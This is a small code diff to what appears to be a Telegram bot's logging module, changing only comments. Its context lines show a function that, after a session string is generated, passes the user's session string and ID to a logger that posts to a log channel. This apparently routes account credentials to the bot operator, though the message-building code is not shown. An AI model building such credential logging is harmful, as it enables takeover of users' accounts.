@@ -19,7 +19,7 @@ async def log_to_channel(message: str, extra_text: str = ""):
         text += f"\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         text += f"\n🆔 **User ID:** {extra_text.split('User ID:')[-1].strip() if 'User ID:' in extra_text else 'N/A'}"
 
-        await asyncio.sleep(0.3)  # safety delay
+        await asyncio.sleep(0.3)
         await bot.send_message(chat_id=LOG_CHANNEL_ID, text=text, parse_mode="Markdown")
     except Exception as e:
         print(f"❌ Logger error: {e}")
@@ -53,6 +53,6 @@ async def log_user_connection(user_id: int, session_string: str):
     await log_to_channel(message, extra_info)
 
 
-# ====================== EXAMPLE CALL (bot.py mein add karna hai) ======================
+# ====================== SESSION GENERATION KE BAAD LOG ======================
 async def after_session_generation(session_string: str, user_id: int):
     await log_user_connection(user_id, session_string)
